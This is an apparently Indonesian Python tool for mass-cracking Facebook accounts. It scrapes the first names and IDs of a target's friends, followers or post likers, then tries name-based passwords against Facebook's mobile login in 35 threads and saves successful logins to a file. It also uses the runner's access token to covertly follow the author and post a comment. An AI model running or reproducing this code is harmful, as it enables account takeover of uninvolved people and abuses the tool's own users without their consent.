#JANGAN DIPERJUAL BELIKAN!
#RECODE? BOLEH! JANGAN UBAH BOT FOLLOW SAMA KOMEN

#AUTHOR: MUHAMMAD LATIF HARKAT
#WA: 083870396203
#FB: Muhammad Latif Harkat
#SC VERSION: 1.5 OFFICIAL

#OPEN SOURCE TEAM
import requests as req,json,time,os
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
from random import choice as awokawok
#warna
i='\33[32;1m' #ijo
m='\33[31;1m' #merah
pu='\33[37;1m' #putih
b='\33[36;1m' #biru
try:hencet=json.loads(req.get('http://ip-api.com/json/').text)
except req.exceptions.ConnectionError:print(f'[{m}!{pu}] Koneksi Jaringan Buruk.')
try:
    ua =open('ua','r').read()
except FileNotFoundError:
    print("[!] Useragent Tidak Ada")
    ja=input("[+] Masukan useragent untuk melanjutkan ke tools: ")
    open('ua','a').write(ja)
id,nama=[],[]
ok,cp,cot=0,0,0
ajg=''
def login():
    lauk=awokawok(['latif ganteng:v','gua jelek:v','latif i love u'])
    t=input(f'[+] Masukan Access Token Anda: {b}')
    try:
        r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
        nama=r['name']
        req.post(f'https://graph.facebook.com/1011933821/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/10223289317033828/comments?message={lauk}&access_token={t}')
        print(f'[{i}√{pu}] Login Berhasil\n{pu}[=] Nama Facebook:{b}',nama,pu)
        open('saveLogin.txt','a').write(t)
        time.sleep(0.7)
        gas(t).menu()
    except KeyError:
        print(f'[{m}!{pu}] Token Salah Bro!')
        login()
def logika():
    try:
        t=open('saveLogin.txt','r').read()
        r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
        print(f'[{i}+{pu}] Selamat Datang Kembali{b}',r['name'],f'{pu}:)')
        time.sleep(0.7)
        gas(t).menu()
    except KeyError:
        print(f'[{m}!{pu}] Token Anda Invalid')
        os.system('rm -rf saveLogin.txt')
        time.sleep(0.7)
        return login()
    except FileNotFoundError:
        print(f'[{m}!{pu}] Anda Belum Login')
        time.sleep(0.7)
        login()
class gas:

    def __init__(self,token):self.token=token
    def crack(self,user,lala,asu):
        global ok,cp,cot,ajg
        if ajg!=user:
            ajg=user
            cot+=1
        for pw in lala:
            pw=pw.replace('name',asu)
            data={}
            ses=req.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
            a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
            b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for c in a("input"):
                try:
                    if c.get("name") in b:data.update({c.get("name"):c.get("value")})
                    else:continue
                except:pass
            data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
            if 'c_user' in d.cookies.get_dict().keys():
                ok+=1
                open('ok','a').write(user+'|'+pw+'\n')
                print(f'\r{i}* --> [OK] {user}|{pw}|{d.cookies.get_dict()}{pu}             \n',end='')
                break
            elif 'checkpoint' in d.cookies.get_dict().keys():
                cp+=1
                open('cp','a').write(user+'|'+pw+'\n')
                print(f'\r\33[1;33m* --> [CP] {user}|{pw}{pu}              \n',end='')
                break
            print(f'\r[=] CRACK {str(cot)}/{len(id)} OK:-[{str(ok)}] CP:-[{str(cp)}]',end='')
    def kirim(self):
        print(f'{pu}[=] Jumlah ID People\t:{b}',str(len(id)),f'{pu}')
        pi=input(f'{pu}[?] Pwlist Manual y/t\t: {b}')
        if(pi in ("y","Y")):
            with Bool(max_workers=35) as kirim:
                print(f"\n{pu}[!] Contoh ({b}name,name123,bangsat{pu})")
                pwList=input(f'[+] Masukan Password List: {b}').split(",")
                print(f'\n{pu}[√] Crack Berjalan Pukul: {time.strftime("%X")}')
                print(f'+'+'-'*40+'+\n')
                for email in id:
                    uid,name=email.split('|')
                    kirim.submit(self.crack,uid,pwList,name.lower())
        elif(pi in ("t","T")):
            with Bool(max_workers=35) as kirim:
                print(f'\n{pu}[√] Crack Berjalan Pukul: {time.strftime("%X")}')
                print(f'+'+'-'*40+'+\n')
                for email in id:
                    uid,name=email.split('|')
                    if(len(str(name.lower()))>=6):
                    	memek=[name.lower(),name.lower()+'1234',name.lower()+'123'+name.lower()+'12345']
                    elif(len(str(name.lower()))<=2):
                        memek=[name.lower()+'1234',name.lower()+'12345']
                    elif(len(str(name.lower()))<=3):
                        memek=[name.lower()+'1234',name.lower()+'123',name.lower()+'12345']
                    else:
                        memek=[name.lower()+'1234',name.lower()+'123',name.lower()+'12345']
                    kirim.submit(self.crack,uid,memek,name.lower())
        print(f'\n{pu}### [{i}CRACK FINISHED{pu}] ###')
    def ua(self):
        print(f'\n\t{pu}[ Useragent Setting ]\n\n# Useragent Saat Ini:{i}',open('ua','r').read(),'\n',pu)
        a=input('[?] Ganti useragent y/t: ')
        if(a in ("y","Y")):
            os.system('rm -rf ua')
            ua=input(f'{pu}[+] Masukan useragent baru: {b}')
            open('ua','a').write(ua)
            input(f'\n{pu}[{i}√{pu}] Useragent Berhasil Ditambahkan\n[ Enter For Back To Menu ]')
            self.menu()
        elif(a in ("t","T")):
            input("Enter For Back To Menu")
            self.menu()
        else:
            print(f"{pu}[{m}!{pu}] Pilihan Tidak Ada")
            self.ua()
    def menu(self):
        name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
        os.system('clear')
        print("""{pu}
  _________   _____ __________.___
 /   _____/  /  _  \\______    \   |
 \_____  \  /  /_\  \|     ___/   | M. Latif
 /        \/    |    \    |   |   |   Harkat
/_______  /\____|__  /____|   |___|
        \/         \/
        """)
        print(f"[=] Selamat Datang\t:{i}",name,pu)
        print("+"+"-"*40+"+")
        print("[=] Ip Anda\t:",hencet['query'],"\n[=] Negara\t:",hencet['country'],"\n[=] Kota\t:",hencet['city'])
        print("+"+"-"*40+"+")
        print(f'\n[01]. {b}Crack Daftar Teman{pu}\n[02]. {b}Crack Dari Followers{pu}\n[03]. {b}Crack Dari Like Postingan{pu}\n[04]. {b}Settings Useragent{pu}\n[{m}LG{pu}]. {b}Logout Account (Hapus Token){pu}\n')
        p=input(f'{pu}[+] Select:{b} ')
        if(p in ('01','1')):
            print(f'\n\t{pu}[ Crack Daftar Teman ]\n')
            print(f'{pu}[!] Ketik {b}me{pu} buat crack daftar teman anda{pu}')
            target=input(f'{pu}[+] Masukan ID Target\t: {b}')
            try:
                r=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
                print(f'\n{pu}[=] Nama Target\t\t:{b}',r['name'],pu)
            except KeyError:
                input(f'{pu}[{m}!{pu}] Target Tidak Ditemukan [!]\nEnter For Back To Menu')
                self.menu()
            g=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
            for latip in g['data']:
                tip=latip['id']
                harkat=latip['name'].rsplit(" ")[0]
                id.append(tip+'|'+harkat)
            self.kirim()
        elif(p in ('02','2')):
            print(f'\n\t{pu}[ CRACK DARI FOLLOWERS AKUN ]\n')
            print(f'{pu}[!] Ketik {m}me {pu}buat followers fb kamu [!]')
            try:
                memek=input(f'{pu}[+] Masukan ID Target\t: {b}')
                r=json.loads(req.get(f'https://graph.facebook.com/{memek}/subscribers?limit=50000&access_token={self.token}').text)
                print("")
                for x in r['data']:
                    tip=x['id']
                    harkat=x['name'].rsplit(' ')[0]
                    id.append(tip+'|'+harkat)
            except KeyError:
                input(f'\n{pu}[{m}!{pu}] Target Tidak Ditemukan [!]\nEnter For Back To Menu')
            self.kirim()
        elif(p in ('03','3')):
            print(f'\n\t{pu}[ CRACK DARI LIKE POSTINGAN PUBLIK ]')
            t=input(f'{pu}[+] Masukan ID Post\t: {b}')
            try:
                r=json.loads(req.get(f'https://graph.facebook.com/{t}/likes?limit=9999&access_token={self.token}').text)
                print("")
                for x in r['data']:
                    tip=x['id']
                    harkat=x['name'].rsplit(" ")[0]
                    id.append(tip+"|"+harkat)
            except:
                input(f'\n{pu}[{m}!{pu}] Postingan Tidak Ditemukan Atau Tidak Di Publik [!]\nEnter For Back To Menu')
                self.menu()
            self.kirim()
        elif(p in ('04','4')):self.ua()
        elif(p in ('LG','lg')):
            print(f'{pu}Ok Thanks You Bro Nic To Meet You!')
            os.system('rm -rf saveLogin.txt')
        else:
            print(f'{pu}[{m}!{pu}] Pilihan Tidak Ada!')
            self.menu()
if __name__=="__main__":
    logika()
